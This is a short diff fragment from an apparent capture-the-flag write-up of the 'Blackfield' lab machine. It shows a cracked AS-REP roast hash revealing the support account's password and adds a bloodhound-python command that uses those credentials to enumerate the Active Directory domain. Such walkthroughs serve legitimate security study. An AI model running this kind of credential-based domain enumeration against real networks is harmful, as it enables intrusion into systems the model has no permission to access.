@@ -98,3 +98,12 @@ SMB shares reveal two non-default shares named `forensic` and `profiles$`. The s
 ```CSS
 #00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
 ```
+
+---
+
+## BloodHound Python
+```CSS
+▶ bloodhound-python --username support --password '#00^BlackKnight' --domain blackfield.local --nameserver 10.10.10.192 --collectionmethod all
+```
+
+---
